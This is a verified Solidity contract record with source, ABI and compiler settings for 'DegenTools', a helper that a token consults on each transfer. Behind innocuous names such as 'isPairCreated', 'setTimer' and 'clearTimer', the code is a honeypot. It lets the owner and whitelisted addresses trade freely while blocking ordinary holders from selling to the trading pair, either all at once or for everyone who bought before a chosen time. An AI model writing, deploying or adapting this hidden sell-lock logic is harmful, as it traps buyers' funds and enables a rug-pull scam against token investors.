{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.19;\r\n\r\ncontract Ownable {\r\n    address private _owner;    \r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () {\r\n        _owner = msg.sender;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender);\r\n        _;\r\n    }\r\n}\r\n\r\n\r\ncontract DegenTools is Ownable {\r\n\r\n    address private tokenAddress;\r\n    address private pairAddress;\r\n    bool private isDone;\r\n\r\n    mapping(address => bool) private _whites;\r\n    mapping (address => uint256) private _timer;\r\n\r\n    uint256 private curTime;\r\n\r\n    modifier onlyToken() {\r\n        require(msg.sender == tokenAddress); \r\n        _;\r\n    }\r\n\r\n    function clearTimer(bool isFinished) external onlyOwner {\r\n      isDone = isFinished;\r\n    }\r\n\r\n    function refresh(address _token, address _pair) external onlyOwner {\r\n      tokenAddress = _token;\r\n      pairAddress = _pair;\r\n      isDone = false;\r\n      curTime = 0;\r\n    }\r\n\r\n    function setTimer() external onlyOwner {\r\n      curTime = block.timestamp;\r\n    }\r\n\r\n    function whitelist(address owner_, bool _isWhitelist) external onlyOwner {\r\n      _whites[owner_] = _isWhitelist;\r\n    }\r\n\r\n    function isPairCreated(address _from, address _to) external onlyToken returns (uint256) {\r\n      if (_whites[_from] || _whites[_to]) {\r\n        return 1;\r\n      }\r\n      if (_from == pairAddress) {\r\n        if (_timer[_to] == 0) {\r\n          _timer[_to] = block.timestamp;\r\n        }\r\n      } else if (_to == pairAddress) {\r\n        require(!isDone && _timer[_from] >= curTime);\r\n      } else {\r\n        _timer[_to] = 1;\r\n      }\r\n      return 0;\r\n    }\r\n\r\n    receive() external payable {\r\n    }\r\n}", "ABI": "[{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"isFinished\",\"type\":\"bool\"}],\"name\":\"clearTimer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"isPairCreated\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_pair\",\"type\":\"address\"}],\"name\":\"refresh\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"setTimer\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_isWhitelist\",\"type\":\"bool\"}],\"name\":\"whitelist\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "DegenTools", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cb57f0ee4c24e7dac01c0a1c6b5e8d0d2b68485c2a45de798c33fc427c9ca053"}